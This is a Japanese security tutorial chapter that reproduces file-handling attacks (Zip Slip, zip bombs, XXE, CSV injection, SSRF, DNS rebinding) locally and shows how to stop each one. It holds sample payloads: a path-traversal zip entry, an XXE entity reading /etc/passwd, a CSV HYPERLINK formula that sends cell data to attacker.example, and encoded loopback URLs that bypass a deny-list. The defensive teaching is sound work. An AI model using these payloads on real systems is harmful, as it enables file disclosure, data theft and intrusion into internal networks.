@@ -1,0 +1,603 @@
+---
+title: ファイルを受け取る、返す
+description: 利用者が上げたファイルを開く、利用者に CSV を渡す、利用者が指定した URL から取り込む。どれも「中身は相手が決める」入力です。Zip Slip、zip bomb、XXE、CSV インジェクション、SSRF を手元で再現し、どこで止めればよいかを確かめます
+chapter: assure
+order: 7
+status: published
+topics:
+  - CSV インジェクション（数式インジェクション）
+  - Zip Slip / パストラバーサル
+  - zip bomb（展開爆弾）
+  - XXE
+  - SSRF
+  - DNS rebinding
+  - IMDSv2
+  - Content-Type / MIME sniffing
+  - 署名付き URL
+requires:
+  - ll-174-sec-map
+  - ll-99-security-headers
+  - ll-128-workload-identity
+---
+
+import Callout from '../../components/Callout.astro'
+
+## 「ファイル」という入力
+
+前回は、テナントの境界をどこで越えてしまうかを見ました。この回は、もっと素朴に見える機能を扱います。**ファイルのアップロード、エクスポート、URL からの取り込み**です。
+
+| 機能 | 受け取るもの | 起きうること |
+| --- | --- | --- |
+| zip を上げると中身を展開する | アーカイブ | 展開先の外にファイルを書かれる（Zip Slip）。ディスクやメモリを使い切られる（zip bomb） |
+| Excel や Word のファイルを読む | XML の入った zip | 外部実体の参照でサーバのファイルを読まれる（XXE） |
+| 画像を上げるとサムネイルを作る | 画像 | 画像処理ライブラリの脆弱性を突かれる。巨大な画素数で止められる |
+| 一覧を CSV で書き出す | （他の利用者が入れた）文字列 | 開いた人の表計算ソフトで数式として動く（CSV インジェクション） |
+| URL を渡すと取り込む | URL | サーバに内部のアドレスへ要求を送らせる（SSRF） |
+| 上げたファイルをそのまま配る | 任意のバイト列 | ブラウザに HTML やスクリプトとして解釈させる |
+
+どれも、第 174 回の言葉で言えば**信頼境界を越えて入ってきたデータ**を、こちらのプログラムが**データ以上のもの**として扱ってしまう問題です。ファイル名はパスとして、セルの値は数式として、XML の宣言は読み込み命令として、URL は社内ネットワークへの通行証として解釈されます。
+
+この回では、そのうち Zip Slip、zip bomb、XXE、CSV インジェクション、SSRF を手元で再現し、止め方を確かめます。最後に、保存と配信の置き場所を見ます。
+
+## 実験の環境
+
+この回の実験は、次の環境で行いました。すべて Python の標準ライブラリだけで書き、手元のファイルシステムと `127.0.0.1` で動かすサーバの中で完結させています。
+
+| 項目 | バージョン |
+| --- | --- |
+| OS | macOS 26.2（Darwin 25.2.0、arm64） |
+| Python | 3.14.0（`python3 -I` で実行） |
+| Expat | 2.7.3（`pyexpat.EXPAT_VERSION`） |
+
+<Callout type="note" title="実験を自分で試すとき">
+  この回のスクリプトは、作業用の一時ディレクトリの中にわざと「外に書く」zip を作ります。
+  必ず空のディレクトリで試し、展開先より上の階層に大事なファイルを置かないでください。
+  SSRF の実験も、自分のマシンで立てたサーバにだけ要求を送ります。
+  クラウドのメタデータサービスなど、実在する宛先には向けません。
+</Callout>
+
+## Zip Slip: ファイル名がパスになる
+
+zip の中の各ファイルには名前が付いています。その名前は、作った人が自由に決められます。`report.txt` でも、`../../evil.txt` でも構いません。
+
+展開する側が「展開先のディレクトリ」と「zip の中の名前」を素直につなぐと、`..` が親のディレクトリへ上る指示として働きます。2018 年 6 月に Snyk がこの型の脆弱性を多くのライブラリやプロジェクトで見つけ、**Zip Slip** と名付けて公表しました（[Snyk](https://security.snyk.io/research/zip-slip-vulnerability)）。実行ファイルや設定ファイルを上書きされれば、そのままコードの実行につながります。
+
+### 手元で再現する
+
+`zipfile` で、普通のファイルと `../../evil.txt` という名前のファイルを 1 つずつ持つ zip を作ります。展開先は `app/uploads/target` です。
+
+```python
+with zipfile.ZipFile(z, "w") as zf:
+    zf.writestr("report.txt", "hello\n")
+    zf.writestr("../../evil.txt", "written outside\n")
+```
+
+まず、名前をそのままつなぐ素朴な展開です。
+
+```python
+def naive_extract(zpath, dest):
+    with zipfile.ZipFile(zpath) as zf:
+        for info in zf.infolist():
+            out = os.path.join(dest, info.filename)
+            os.makedirs(os.path.dirname(out), exist_ok=True)
+            with open(out, "wb") as f:
+                f.write(zf.read(info))
+```
+
+```
+entries: ['report.txt', '../../evil.txt']
+naive:
+  wrote app/uploads/target/report.txt
+  wrote app/evil.txt
+exists app/evil.txt: True
+```
+
+`app/uploads/target/../../evil.txt` は `app/evil.txt` です。**展開先の 2 つ上**に書かれました。
+
+### 正規化してから、範囲の中かを確かめる
+
+止め方は、**書く前に、実際に書く先の絶対パスを求め、それが展開先の中にあるかを確かめる**ことです。文字列として `..` を含むかどうかを調べるのではありません。`foo/../../x` や絶対パス、Windows の `\` など、上る書き方はいくつもあるからです。
+
+```python
+def safe_extract(zpath, dest):
+    root = os.path.realpath(dest)
+    with zipfile.ZipFile(zpath) as zf:
+        for info in zf.infolist():
+            out = os.path.realpath(os.path.join(root, info.filename))
+            if os.path.commonpath([root, out]) != root:
+                print("  rejected", info.filename, "->", os.path.relpath(out, base))
+                continue
+            ...
+```
+
+```
+safe:
+  wrote app/uploads/target/report.txt
+  rejected ../../evil.txt -> app/evil.txt
+exists app/evil.txt: False
+```
+
+`realpath` は `..` を解決し、シンボリックリンクもたどります。`commonpath` で「展開先と書く先の共通の祖先が、展開先そのものか」を比べます。`startswith` で文字列の前方一致を見ると、展開先が `/srv/up` のときに `/srv/upload-other/x` を通してしまうので、パスの部品単位で比べる関数を使います。
+
+### ライブラリの展開関数はどうしているか
+
+Python の `zipfile.ZipFile.extractall` を同じ zip に使うと、結果は次のようになりました。
+
+```
+zipfile.extractall:
+   app/uploads/target/report.txt
+   app/uploads/target/evil.txt
+```
+
+`zipfile` は、名前が絶対パスなら先頭の `/` やドライブ名を取り除き、**名前の中の `..` の部品をすべて取り除いてから**展開します（[Python ドキュメント: zipfile](https://docs.python.org/3/library/zipfile.html)）。そのため `evil.txt` は展開先の中に落ちました。それでも同じドキュメントは、信頼できない出どころのアーカイブを中身を確かめずに展開しないよう警告しています。
+
+tar はもっと危険です。tar はシンボリックリンクやデバイスファイルを入れられるので、「`/etc` を指すリンク」を先に置き、そのリンクの下に書かせることができます。Python 3.14 では `tarfile` の既定の展開フィルタが `data` になり、展開先の外へのパスや、絶対パスを指すリンクを拒否するようになりました（[Python ドキュメント: tarfile](https://docs.python.org/3/library/tarfile.html)）。手元でも、`../evil.txt` と `/etc` を指すリンクを入れた tar は、どちらも例外で止まりました。
+
+```
+OutsideDestinationError '../evil.txt' would be extracted to '.../ts/evil.txt', which is outside the destination
+AbsoluteLinkError 'link' is a link to an absolute path
+```
+
+**言語やライブラリの版によって、既定の振る舞いは違います**。自分で展開の処理を書くときはもちろん、ライブラリの関数を呼ぶときも、その版で何を防いでいるかを確かめる必要があります。
+
+<Callout type="tip" title="そもそも利用者の付けた名前で保存しない">
+  Zip Slip は「相手が付けた名前を、こちらのファイルシステムの名前として使う」ことから起きます。
+  アップロードされたファイル自体についても同じです。
+  OWASP のファイルアップロードのチートシートは、
+  **保存するファイル名はアプリケーションが生成したものに変える**よう勧めています
+  （[OWASP File Upload Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.html)）。
+  元の名前は、データベースの列に「表示用の文字列」として持てば十分です。
+</Callout>
+
+## zip bomb: 小さく送って大きく広げる
+
+圧縮は、繰り返しの多いデータほどよく縮みます。ということは、**同じバイトを延々と並べたデータは極端に縮む**ということです。受け取った側が何も考えずに展開すると、送られてきた量の何百倍、何千倍ものディスクやメモリを使わされます。
+
+### 倍率を測る
+
+100 MiB のゼロを、`zipfile` の DEFLATE で圧縮してみます。展開はせず、書き込むときに 1 MiB ずつ流し込んでいるので、手元のメモリやディスクを大きく使うことはありません。
+
+```python
+chunk = b"\0" * (1 << 20)
+with zipfile.ZipFile(z, "w", zipfile.ZIP_DEFLATED) as zf:
+    with zf.open("zeros.bin", "w", force_zip64=True) as f:
+        for _ in range(100):
+            f.write(chunk)
+```
+
+```
+zip size        : 102,059 bytes
+declared size   : 104,857,600 bytes
+compressed size : 101,923 bytes
+ratio           : 1,029 : 1
+```
+
+**約 100 KB の zip が、100 MiB に広がります**。1 つのファイルを素直に圧縮するだけでこの倍率です。
+
+David Fifield は 2019 年に、zip の中の複数のファイルが**同じ圧縮データを重ねて参照する**ように作ることで、入れ子の zip に頼らずに 1 回の展開で広がる zip bomb を示しました。入力の大きさの 2 乗で出力が増え、10 MB の zip が 281 TB に広がります（[USENIX WOOT '19](https://www.usenix.org/conference/woot19/presentation/fifield)）。
+
+### 何で止めるか
+
+zip のヘッダには、各ファイルの「圧縮後の大きさ」と「展開後の大きさ」が書かれています。これを見て倍率の大きいものを先に断れます。ただし、**ヘッダは作った人が書いた値**です。本当に効く制限は、展開しながら数えることです。
+
+```python
+MAX_TOTAL = 10 * 1024 * 1024
+MAX_RATIO = 100
+
+if info.compress_size and info.file_size / info.compress_size > MAX_RATIO:
+    print(f"  header check: ratio ... > {MAX_RATIO}, reject {info.filename}")
+
+total = 0
+with zf.open(info) as f:
+    while True:
+        buf = f.read(64 * 1024)
+        if not buf: break
+        total += len(buf)
+        if total > MAX_TOTAL:
+            print(f"  stream check: stopped at {total:,} bytes > limit {MAX_TOTAL:,}")
+            return
+```
+
+```
+  header check: ratio 1028 > 100, reject zeros.bin
+  stream check: stopped at 10,551,296 bytes > limit 10,485,760
+```
+
+ヘッダの検査で先に断れました。ヘッダの検査を外しても、展開しながら数える側が 10 MiB を少し越えたところで止めています。**全部を展開してから大きさを見る**のでは遅い、というのが要点です。
+
+ヘッダを偽った場合も試しました。20 MiB のゼロを圧縮した zip の「展開後の大きさ」を 1000 バイトに書き換えると、Python の `zipfile` は宣言された大きさまでしか出力せず、CRC の不一致で例外にしました。
+
+```
+declared: 1000 compressed: 20387
+read: 0 then BadZipFile Bad CRC-32 for file 'zeros.bin'
+```
+
+これは Python の実装が宣言を上限として使っているからで、すべての実装が同じとは限りません。**自分の側で数える上限**を持つのが確実です。
+
+| 制限 | 何を防ぐか |
+| --- | --- |
+| アップロードの大きさの上限 | そもそも大きなファイルを受け取らない |
+| 展開後の合計の上限（展開しながら数える） | 倍率の高い 1 ファイル |
+| ファイル数の上限 | 小さなファイルを大量に作らせて i ノードを使い切る |
+| 入れ子の深さの上限 | zip の中の zip を再帰的に開かせる |
+| 処理時間とメモリの上限（別プロセスやコンテナで動かす） | 上のどれかが漏れた場合 |
+
+Python のドキュメントも、zip bomb によってディスクを使い切られうることを「展開の落とし穴」として挙げています（[Python ドキュメント: zipfile](https://docs.python.org/3/library/zipfile.html)）。
+
+画像も同じ構造を持っています。PNG は中身が圧縮されているので、数 KB のファイルが何万×何万画素に広がります。Pillow は、画素数が `MAX_IMAGE_PIXELS` を超えると `DecompressionBombWarning` を、その 2 倍を超えると `DecompressionBombError` を出します（[Pillow ドキュメント](https://pillow.readthedocs.io/en/stable/reference/Image.html)）。
+
+## XXE: xlsx は XML の zip
+
+Excel の `.xlsx` や Word の `.docx` は、**XML のファイルをいくつも入れた zip** です。この入れ物の形式は Open Packaging Conventions として ECMA-376 の Part 2 に定められています（[Wikipedia: Open Packaging Conventions](https://en.wikipedia.org/wiki/Open_Packaging_Conventions)）。つまり「Excel のファイルを取り込む」機能は、前の 2 節の zip の問題と、XML の問題を両方抱えます。
+
+XML には DTD（文書型定義）という古い仕組みがあり、その中で**実体**（entity）を宣言できます。外部実体は、ファイルや URL の中身を文書の中に差し込む宣言です。
+
+```xml
+<?xml version="1.0"?>
+<!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/passwd">]>
+<r>&x;</r>
+```
+
+パーサがこの宣言に従うと、`&x;` の位置にサーバのファイルの中身が入ります。取り込んだ結果を画面に出したりエラーメッセージに含めたりすれば、それが攻撃者に返ります。URL を書けば、次の節の SSRF にもなります。これが **XXE**（XML External Entity）です。
+
+手元で、作業ディレクトリに置いた `secret.txt` を外部実体として参照する文書を、Python の標準ライブラリのパーサ 3 つに読ませました。
+
+```
+expat expat_2.7.3
+etree: ParseError undefined entity &x;: line 1, column 214
+minidom: '<r/>'
+```
+
+`xml.etree.ElementTree` は実体を未定義として例外にし、`minidom` は中身を差し込まずに空の要素を返し、`xml.sax` は文字を 1 つも報告しませんでした。**この版の Python の標準ライブラリは、既定では外部実体を読みに行きません**。
+
+それでも OWASP の XXE のチートシートは、信頼できない XML には `defusedxml` の関数を使うよう勧めています（[OWASP XXE Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html)）。実体を何段にも入れ子にして指数関数的に広げる **billion laughs** のような攻撃は、外部実体を読まなくても成り立つからです。Python のドキュメントは、Expat 2.7.2 より前の版がこの種の攻撃に弱い可能性があると書いています（[Python ドキュメント: XML の脆弱性](https://docs.python.org/3/library/xml.html)）。
+
+同じチートシートの最初の推奨は、**可能なら DTD を無効にし、DOCTYPE 宣言そのものを拒否する**ことです。Java の `DocumentBuilderFactory` など、言語やライブラリごとにそのための設定が個別に示されています。業務のファイル形式で DTD が必要になることはまずありません。
+
+<Callout type="warn" title="「XML を受け付けていない」つもりでも">
+  API が JSON しか受け付けなくても、xlsx や docx、SVG（画像ですが XML です）、SAML の応答、
+  RSS の取り込みなど、XML は思わぬ入口から入ってきます。
+  依存しているライブラリが内部でどの XML パーサを、どの設定で使っているかまで含めて確かめる必要があります。
+  第 175 回の SAST は、この種の「危険な設定でパーサを作っている箇所」を見つけるのが得意です。
+</Callout>
+
+## CSV インジェクション: セルが数式になる
+
+ここまでは「受け取る」側の話でした。**渡す**側にも問題があります。
+
+管理画面に「一覧を CSV で書き出す」ボタンがあるとします。一覧には、利用者が入力した名前やコメントが並びます。CSV そのものはただの文字列ですが、それを開く表計算ソフトは、**`=` で始まるセルを数式として評価します**。
+
+OWASP は、次の文字で始まるセルを危険としています（[OWASP CSV Injection](https://community.owasp.org/attacks/CSV_Injection)）。
+
+- `=`、`+`、`-`、`@`
+- タブ（0x09）、復帰（0x0D）、改行（0x0A）
+- 全角の `＝`、`＋`、`－`、`＠`
+
+数式として動くと、`HYPERLINK` で外部の URL へ他のセルの値を付けて送らせたり、古い環境では外部のプログラムを起動させたりできます。攻撃者は自分では管理画面を開けませんが、**管理者が CSV を開く瞬間に、管理者の権限と端末で動く**わけです。
+
+### 手元で作る
+
+利用者の入力を模した行を、Python の `csv` で素直に書き出します。
+
+```
+--- naive
+name,comment
+alice,=1+1
+bob,"=HYPERLINK(""http://attacker.example/?d=""&A2,""詳細"")"
+carol,-2+3
+dave,"@SUM(1,1)"
+erin,	=1+1
+frank,-5
+grace,＝1+1
+```
+
+`csv` モジュールは、カンマや `"` を含むセルを正しく引用符で囲んでいます。**CSV としては何も間違っていません**。問題は CSV の形式ではなく、開く側が値を解釈することにあります。だから、CSV のライブラリを正しく使うだけでは防げません。
+
+### 先頭に ' を付ける
+
+OWASP の推奨は、**各セルを `"` で囲み、`"` は `""` に二重化し、危険な文字で始まるセルの先頭に `'` を付ける**ことです（[OWASP CSV Injection](https://community.owasp.org/attacks/CSV_Injection)）。表計算ソフトは `'` で始まるセルを文字列として扱います。
+
+```python
+DANGER = ("=", "+", "-", "@", "\t", "\r", "\n", "＝", "＋", "－", "＠")
+def escape_cell(v):
+    v = str(v)
+    if v.startswith(DANGER):
+        v = "'" + v
+    return v
+
+w = csv.writer(out, quoting=csv.QUOTE_ALL, lineterminator="\n")
+```
+
+```
+--- escaped
+"name","comment"
+"alice","'=1+1"
+"bob","'=HYPERLINK(""http://attacker.example/?d=""&A2,""詳細"")"
+"carol","'-2+3"
+"dave","'@SUM(1,1)"
+"erin","'	=1+1"
+"frank","'-5"
+"grace","'＝1+1"
+```
+
+ここで 2 つの代償が見えます。
+
+- **`-5` のような負の数も `'-5` になる**。数値の列を CSV で渡す用途では、受け取った側が数値として扱えなくなります。列の型が分かっているなら、数値の列にはこの処理を掛けず、数値として検証してから出すほうがよい
+- **CSV を機械で読み直すと `'` が残る**。手元で `csv.reader` に読ませると、値は `'=1+1` のままでした。人が表計算ソフトで開く用途と、他のシステムに取り込ませる用途では、同じ処理が正しいとは限りません
+
+OWASP は、この方法も Excel で保存して開き直すと当てにならないと注記し、引用符の中で先頭にタブを置く別の方法も挙げています。**どの方法も「開く側がどう解釈するか」に依存する**ので、完全な防御にはなりません。表計算ソフトで開くことが前提なら、xlsx として書き出して、セルの型を文字列に指定するほうが確実です。
+
+## SSRF: URL を渡すと、サーバが取りに行く
+
+「画像の URL を貼ると取り込む」「Webhook の送り先を登録する」「URL のプレビューを作る」。どれも、**利用者が指定した宛先へ、サーバが HTTP の要求を送る**機能です。
+
+サーバは、利用者の端末からは届かない場所に届きます。社内の管理画面、データベースの管理 API、そして第 128 回で見たクラウドの**インスタンスメタデータ**（`169.254.169.254`）です。利用者に宛先を選ばせれば、サーバの位置から内側を見せることになります。これが **SSRF**（Server-Side Request Forgery）です。
+
+### 実験の構成
+
+`127.0.0.1` からの接続にだけ中身を返す「内部の管理画面」を、手元のサーバで作ります。同じサーバは `/redirect` で `http://127.0.0.1:18180/admin` へのリダイレクトを返します。
+
+```python
+def do_GET(self):
+    local = self.connection.getsockname()[0]
+    if self.path.startswith("/redirect"):
+        self.send_response(302)
+        self.send_header("Location", f"http://127.0.0.1:{port}/admin")
+        ...
+    if self.path == "/admin":
+        if local.startswith("127.") or local == "::ffff:127.0.0.1":
+            body = b"INTERNAL: admin panel (loopback only)\n"
+        else:
+            body = b"forbidden\n"; code = 403
+```
+
+サーバは `0.0.0.0:18180` で待ち受けます。手元のマシンの LAN 側のアドレス（出力では `<LAN>` と伏せます）への接続は「外から来た」ものとして扱い、ここを「外部の、許可してよい宛先」の代わりにします。
+
+### 素朴な検査
+
+よく見る最初の実装は、URL のホスト名の文字列を、禁止の一覧と照らし合わせるものです。
+
+```python
+BLOCK = re.compile(r"^(localhost|127\.\d+\.\d+\.\d+|169\.254\.\d+\.\d+|\[?::1\]?|0\.0\.0\.0)$")
+def naive_check(url):
+    host = urllib.parse.urlsplit(url).hostname
+    return not BLOCK.match(host)
+```
+
+検査を通ったら `urllib.request.urlopen` で取りに行きます。結果は次のとおりでした。
+
+```
+== naive
+http://127.0.0.1:18180/admin                  -> blocked by validator
+http://localhost:18180/admin                  -> blocked by validator
+http://2130706433:18180/admin                 -> 200 INTERNAL: admin panel (loopback only)
+http://0x7f.1:18180/admin                     -> 200 INTERNAL: admin panel (loopback only)
+http://[::ffff:127.0.0.1]:18180/admin         -> 200 INTERNAL: admin panel (loopback only)
+http://<LAN>:18180/redirect                   -> 200 INTERNAL: admin panel (loopback only)
+```
+
+4 つの書き方で、内部の管理画面に届きました。
+
+| URL | なぜ通ったか |
+| --- | --- |
+| `http://2130706433/` | 127.0.0.1 を 1 つの 32 ビット整数で書いたもの（127 × 2<sup>24</sup> + 1） |
+| `http://0x7f.1/` | 先頭を 16 進数で、残りの 3 バイトを 1 つの数で書いたもの |
+| `http://[::ffff:127.0.0.1]/` | IPv4 射影 IPv6 アドレス。IPv6 のソケットから IPv4 の 127.0.0.1 につながる |
+| `http://<LAN>/redirect` | 検査したのは最初の URL だけ。`urlopen` はリダイレクトを自動でたどった |
+
+### IP アドレスの書き方は 1 つではない
+
+IP アドレスを「4 つの 10 進数をドットでつないだもの」と思い込むと、このように抜けます。どの関数がどの書き方を受け付けるかは、関数ごとに違います。手元で 4 つの表記を 3 つの関数に渡しました。
+
+```
+127.0.0.1    ipaddress=127.0.0.1   inet_aton=127.0.0.1  getaddrinfo=127.0.0.1
+2130706433   ipaddress=ValueError  inet_aton=127.0.0.1  getaddrinfo=127.0.0.1
+0x7f.1       ipaddress=ValueError  inet_aton=127.0.0.1  getaddrinfo=127.0.0.1
+0177.0.0.1   ipaddress=ValueError  inet_aton=127.0.0.1  getaddrinfo=177.0.0.1
+```
+
+Python の `ipaddress` は厳密な表記しか受け付けません。C の `inet_aton` は 16 進数、8 進数、部品の少ない表記を受け付けます。そして最後の行では、**同じ `0177.0.0.1` を、`inet_aton` は 8 進数として 127.0.0.1 と読み、このマシンの `getaddrinfo` は 10 進数として 177.0.0.1 と読みました**。ブラウザなどが従う WHATWG の URL 標準も、`0x` で始まる部品を 16 進数、`0` で始まる部品を 8 進数として読み、4 つに満たない表記も受け付けます（[URL Standard: IPv4 parser](https://url.spec.whatwg.org/#concept-ipv4-parser)）。
+
+**検査する側と、実際に接続する側が別の解釈をすれば、検査は意味を失います**。だから「文字列を見て判断する」のをやめ、「実際に接続する IP アドレスを見て判断する」必要があります。
+
+<Callout type="warn" title="0177.0.0.1 の実験で起きたこと">
+  最初の試行では、`0177.0.0.1` も素朴な検査と `urlopen` に渡していました。
+  このマシンの `getaddrinfo` はこれを 177.0.0.1 と解釈したので、**手元ではなく実在する外部のアドレスへの接続を試みて**タイムアウトしました。
+  記事の実験表からはこの行を外し、解釈の違いは接続しない形（上の表）で確かめ直しています。
+  表記ゆれの検査を書くときは、**テストそのものが意図しない宛先に飛ぶ**ことにも注意が要ります。
+</Callout>
+
+### DNS rebinding: 検査のあとで名前の指す先が変わる
+
+ホスト名で渡された場合はどうでしょうか。検査の中で名前を引いて IP アドレスを確かめ、安全なら `urlopen` に URL を渡す、という実装はよくあります。
+
+ところが `urlopen` は、**自分でもう一度名前を引きます**。第 60 回で見たとおり、名前の答えは TTL の間だけ使ってよいもので、TTL を 0 にすれば毎回問い合わせ直させられます。名前の持ち主は攻撃者なので、1 回目には外部のアドレスを、2 回目には `127.0.0.1` を返せます。これが **DNS rebinding** です。第 64 回では「名前が指す先は、名前の持ち主が決める」ことの危うさを、消し忘れたレコードの側から見ました。ここでは同じ性質が、意図的に使われます。
+
+実在の DNS サーバを立てる代わりに、スクリプトの中で名前解決の関数を差し替え、`rebind.test` という名前が 1 回目は LAN のアドレス、2 回目以降は `127.0.0.1` を返すようにして確かめました。
+
+```
+== check then urlopen (resolves twice)
+  [resolver] rebind.test -> <LAN>  (TTL 0)
+  check: ok
+  [resolver] rebind.test -> 127.0.0.1  (TTL 0)
+  result: 200 INTERNAL: admin panel (loopback only)
+== resolve once, connect to that IP
+  [resolver] rebind.test -> <LAN>  (TTL 0)
+  check: ok
+  result: 403 forbidden
+```
+
+検査したときの答えと、接続したときの答えが違います。**確かめたものと使ったものが別**という、典型的な TOCTOU（検査時と使用時の食い違い）です。下の段のように、**1 回だけ名前を引き、確かめたその IP アドレスに直接接続する**と、2 回目の問い合わせ自体が起きません。
+
+### 止め方
+
+OWASP の SSRF のチートシートの推奨をまとめると、次のようになります（[OWASP SSRF Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html)）。
+
+- 宛先が決まっているなら、**許可リスト**にする
+- IP アドレスの検査には、表記ゆれを正しく扱う関数を使い、**その関数が出力した値**で比べる
+- ドメインの許可リストだけでは DNS rebinding を防げないので、**解決した IP アドレスを検査し、HTTP クライアントがその検査済みのアドレスにだけ接続する**ようにする
+- **リダイレクトをたどらない**
+- ネットワークの層でも、そのサーバから内部へ出て行けないようにする
+
+これを最小限の形で書いたのが次の関数です。
+
+```python
+def is_forbidden(ip):
+    ip = ipaddress.ip_address(ip)
+    if ip.version == 6 and ip.ipv4_mapped:
+        ip = ip.ipv4_mapped
+    return not ip.is_global
+
+def safe_fetch(url):
+    u = urllib.parse.urlsplit(url)
+    if u.scheme not in ("http", "https"):
+        return "blocked: scheme"
+    port = u.port or 80
+    ips = {i[4][0] for i in socket.getaddrinfo(u.hostname, port, proto=socket.IPPROTO_TCP)}
+    for ip in ips:
+        if is_forbidden(ip):
+            return f"blocked: {u.hostname} -> {ip}"
+    ip = sorted(ips)[0]
+    conn = http.client.HTTPConnection(ip, port, timeout=3)
+    conn.request("GET", u.path or "/", headers={"Host": u.netloc})
+    r = conn.getresponse()
+    if 300 <= r.status < 400:
+        return f"{r.status} not followed (Location: {r.getheader('Location')})"
+    return f"{r.status} {r.read().decode().strip()}"
+```
+
+ポイントは 3 つです。**名前解決の結果（OS が実際に使う解釈）を検査する**、**検査した IP アドレスに `Host` ヘッダを付けて直接つなぐ**、**3xx は返すだけでたどらない**。`is_global` は、ループバック、プライベート、リンクローカル（`169.254.0.0/16`）などをまとめて「公開のアドレスではない」と判定します。IPv4 射影アドレスは、射影元の IPv4 で判定し直しています。Python 3.13 からは `ipaddress` 自身も、IPv4 射影アドレスの `is_private` や `is_global` を射影元の IPv4 に合わせて判定します（[Python ドキュメント: ipaddress](https://docs.python.org/3/library/ipaddress.html)）。
+
+同じ 6 つの URL を通すと、次のようになりました（実験の都合で、LAN のアドレスだけは公開のアドレスとして扱っています）。
+
+```
+== safe (LAN address treated as public only for this demo)
+http://127.0.0.1:18180/admin                  -> blocked: 127.0.0.1 -> 127.0.0.1
+http://localhost:18180/admin                  -> blocked: localhost -> ::1
+http://2130706433:18180/admin                 -> blocked: 2130706433 -> 127.0.0.1
+http://0x7f.1:18180/admin                     -> blocked: 0x7f.1 -> 127.0.0.1
+http://[::ffff:127.0.0.1]:18180/admin         -> blocked: ::ffff:127.0.0.1 -> ::ffff:127.0.0.1
+http://<LAN>:18180/redirect                   -> 302 not followed (Location: http://127.0.0.1:18180/admin)
+```
+
+すべて止まりました。リダイレクトをたどる必要があるなら、**`Location` の URL に同じ関数をもう一度掛ける**ことになります。
+
+<Callout type="note" title="HTTPS で IP アドレスに直接つなぐとき">
+  上の関数は HTTP だけを扱っています。HTTPS では、IP アドレスに接続しつつ、
+  TLS の SNI と証明書の検証には元のホスト名を使う必要があります（第 109 回）。
+  多くの HTTP クライアントは「名前解決の関数を差し替える」「接続先のアドレスを固定する」口を持っているので、
+  自分で接続を組み立てるより、その口に検査を差し込むほうが安全です。
+  社内の宛先に一切出られない**送信専用のプロキシ**を通す構成にすれば、検査を 1 か所にまとめられます。
+</Callout>
+
+### メタデータサービスの側の守り
+
+第 128 回で見たとおり、SSRF が狙う代表的な宛先がクラウドのインスタンスメタデータです。AWS の IMDSv2 は、アプリケーションの側の検査が漏れたときのための守りを、メタデータサービスの側に足しています（[AWS: How IMDSv2 works](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/instance-metadata-v2-how-it-works.html)）。
+
+| 仕組み | SSRF に対して何が効くか |
+| --- | --- |
+| 最初に `PUT` でトークンを取り、以後の `GET` にヘッダで付ける | URL しか操れない SSRF は、メソッドもヘッダも選べない |
+| `X-Forwarded-For` を含む `PUT` を拒否する | 素通しのリバースプロキシ経由の要求を断る |
+| `PUT` の応答の IP の hop limit が既定で 1 | インスタンスの外へ応答を届かせない。コンテナから使うには引き上げが要る |
+
+**IMDSv2 だけを必須にする**設定を入れておけば、トークンを持たない要求は 401 で断られます。ただし、ヘッダまで操れる SSRF（Webhook の送信機能でヘッダを利用者が指定できる、など）には効きません。アプリケーションの側の検査と、ネットワークの層の遮断と、メタデータの側の守りを**重ねる**のが前提です。
+
+## Content-Type と sniffing: 返すときに種類を決める
+
+ここからは、受け取ったファイルを**返す**ときの話です。
+
+利用者が「画像」として上げたファイルの中身が、実は HTML だったとします。それをアプリケーションと同じオリジンから配り、ブラウザが HTML として表示すれば、そのページの中のスクリプトは**アプリケーションのオリジンで**動きます。第 93 回で見たオリジンの境界の、内側に入られるということです。
+
+ブラウザが応答の種類を決める材料は `Content-Type` ですが、それだけではありません。MIME Sniffing の標準は、その理由を「多くの HTTP サーバが、中身と合わない `Content-Type` を返すから」と書いています。no-sniff のフラグが立っていれば、サーバが示した種類をそのまま使います（[MIME Sniffing Standard](https://mimesniff.spec.whatwg.org/)）。第 99 回では、`nosniff` がないと `text/plain` のファイルがスクリプトとして実行されることを実際に確かめました。
+
+返すときの決まりごとをまとめます。
+
+| 対策 | 理由 |
+| --- | --- |
+| `Content-Type` は**サーバが決める**。アップロード時に送られてきた値を信じない | 送られてくる `Content-Type` は利用者が決めた値（[OWASP File Upload Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.html)） |
+| 拡張子は**許可リスト**で決め、中身の先頭のバイト（マジックバイト）とも照合する | 拡張子だけ、中身だけの検査はそれぞれ偽れる |
+| `X-Content-Type-Options: nosniff` を付ける | 中身から種類を推測させない（第 99 回） |
+| 表示する必要のないものは `Content-Disposition: attachment` で返す | ブラウザに「表示せず保存する」よう指示する（[RFC 6266](https://datatracker.ietf.org/doc/html/rfc6266)） |
+| SVG や HTML は、表示するなら別のオリジンから | SVG は画像だがスクリプトを含められる |
+
+`Content-Disposition` の `filename` に利用者の付けた名前を入れるときは、改行や `"` をそのまま入れないようにします。ヘッダの中に別のヘッダを書き足されるからです。非 ASCII の名前は `filename*` で UTF-8 として渡します。
+
+## 画像処理ライブラリ: 「開く」こと自体が攻撃面
+
+サムネイルを作る、向きを直す、形式を変える。画像を受け取るサービスは、ほぼ必ず画像を**開いて解釈**します。画像の形式は数が多く、複雑で、その解析器は C で書かれていることが多い。ここに脆弱性があれば、**画像を上げるだけで**サーバの上でコードが動きます。
+
+2016 年の **ImageTragick**（CVE-2016-3714 ほか）はその代表です。ImageMagick は拡張子ではなく中身から形式を判断し、MVG や MSL といった独自の形式や、外部のコマンドに処理を委ねる仕組みを持っていました。その委譲の入力の検査が不十分で、細工した「画像」を処理させるとコマンドを実行できました。公表時の緩和策は、`policy.xml` で危険な形式（`EPHEMERAL`、`URL`、`MVG`、`MSL` など）を無効にすることと、ImageMagick に渡す前に**マジックバイトが受け付ける形式のものか**を確かめることでした（[ImageTragick](https://imagetragick.com/)）。
+
+ここから引き出せる原則は次のとおりです。
+
+- 受け付ける形式を絞り、ライブラリの側でもそれ以外の形式を無効にする
+- 画像は**デコードして、許可した形式で再エンコードする**。不要なメタデータ（位置情報を含む EXIF など）もそこで落とす（[OWASP File Upload Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.html)）
